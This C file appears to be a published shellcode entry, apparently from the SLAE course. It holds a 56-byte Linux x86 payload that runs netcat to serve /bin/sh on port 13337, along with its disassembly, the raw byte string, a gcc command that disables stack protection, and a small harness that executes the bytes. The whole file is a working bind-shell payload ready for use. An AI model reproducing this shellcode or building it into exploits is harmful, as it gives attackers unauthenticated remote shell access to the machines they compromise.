/*
# Linux x86 /bin/nc -le /bin/sh -vp13337 shellcode(56bytes)
 # Author: Author: sajith
# Tested on: i686 GNU/Linux
# Shellcode Length: 56
#SLAE - 750

Disassembly of section .text:

08048060 <_start>:
 8048060: 31 c0                 xor    eax,eax
 8048062: 50                   push   eax
 8048063: 68 33 33 33 37       push   0x37333333
 8048068: 68 2d 76 70 31       push   0x3170762d
 804806d: 89 e6                 mov    esi,esp
 804806f: 50                   push   eax
 8048070: 68 2f 2f 73 68       push   0x68732f2f
 8048075: 68 2f 62 69 6e       push   0x6e69622f
 804807a: 68 2d 6c 65 2f       push   0x2f656c2d
 804807f: 89 e7                 mov    edi,esp
 8048081: 50                   push   eax
 8048082: 68 2f 2f 6e 63       push   0x636e2f2f
 8048087: 68 2f 62 69 6e       push   0x6e69622f
 804808c: 89 e3                 mov    ebx,esp
 804808e: 50                   push   eax
 804808f: 56                   push   esi
 8048090: 57                   push   edi
 8048091: 53                   push   ebx
 8048092: 89 e1                 mov    ecx,esp
 8048094: b0 0b                 mov    al,0xb
 8048096: cd 80                 int    0x80


gcc -fno-stack-protector -z execstack shellcode.c -o shellcode
*/

#include<stdio.h>
#include<string.h>

unsigned char code[] = \

"\x31\xc0\x50\x68\x33\x33\x33\x37\x68\x2d\x76\x70\x31\x89\xe6\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x68\x2d\x6c\x65\x2f\x89\xe7\x50\x68\x2f\x2f\x6e\x63\x68\x2f\x62\x69\x6e\x89\xe3\x50\x56\x57\x53\x89\xe1\xb0\x0b\xcd\x80";

main()
{

printf("Shellcode Length:  %d\n", strlen(code));

int (*ret)() = (int(*)())code;

ret();

}